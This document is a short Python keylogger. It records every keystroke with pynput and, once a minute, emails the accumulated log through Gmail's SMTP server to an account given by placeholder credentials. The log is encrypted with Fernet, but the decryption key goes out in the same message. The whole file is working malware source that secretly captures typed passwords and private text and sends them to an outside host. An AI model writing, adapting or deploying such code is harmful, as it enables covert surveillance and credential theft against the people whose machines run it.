import pynput.keyboard
import threading
import smtplib
from cryptography.fernet import Fernet

# Generate a key and instantiate a Fernet instance
key = Fernet.generate_key()
cipher_suite = Fernet(key)

log = ""


# Callback for each key press
def process_key_press(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + " " + str(key) + " "


# Send mail function with encryption
def send_mail(email, password, message, encryption_key):
    encrypted_message = cipher_suite.encrypt(message.encode())
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    # Including the encryption key in the email content
    email_content = f"Encrypted Log:\n{encrypted_message}\n\nEncryption Key:\n{encryption_key.decode()}"
    server.login(email, password)
    server.sendmail(email, email, email_content)
    server.quit()


# Thread function for sending emails
def report():
    global log
    if log:
        print(log)
        send_mail("Your_email", "APP_Password", log, key)  # Pass the key to send_mail
    log = ""
    timer = threading.Timer(60, report)
    timer.start()


# Set up and start the keylogger
keyboard_listener = pynput.keyboard.Listener(on_press=process_key_press)
with keyboard_listener:
    report()
    keyboard_listener.join()
